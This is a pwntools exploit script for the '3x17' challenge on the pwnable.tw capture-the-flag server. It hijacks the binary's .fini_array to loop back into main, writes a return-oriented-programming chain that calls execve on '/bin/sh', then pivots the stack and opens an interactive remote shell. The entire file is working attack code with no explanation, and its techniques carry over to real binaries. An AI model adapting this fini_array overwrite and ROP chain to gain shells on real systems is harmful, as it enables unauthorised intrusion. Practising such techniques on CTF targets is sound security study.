#!/usr/bin/env python3
from pwn import *

exe = ELF('./3x17')
io = remote('chall.pwnable.tw', 10105)

fini   = exe.get_section_by_name('.fini_array').header.sh_addr
main   = 0x401b6d
dl_fini= 0x402960
leave  = 0x489c24
ret    = 0x402bcf
bss    = 0x4b7000

def w(a, d):
    io.sendlineafter(b'addr:', str(a).encode())
    io.sendafter(b'data:', d)

chain = flat(
    0x47e5d6, b'/bin/sh\x00', bss, 0,
    0x4184d0,
    0x41e4af, 59,
    0x401696, bss,
    0x44a309, 0, 0,
    0x471db5
)

w(fini, flat(dl_fini, main))
for i in range(0, len(chain), 0x18):
    w(fini + 0x10 + i, chain[i:i+0x18])
w(fini, flat(leave, ret))

io.interactive()
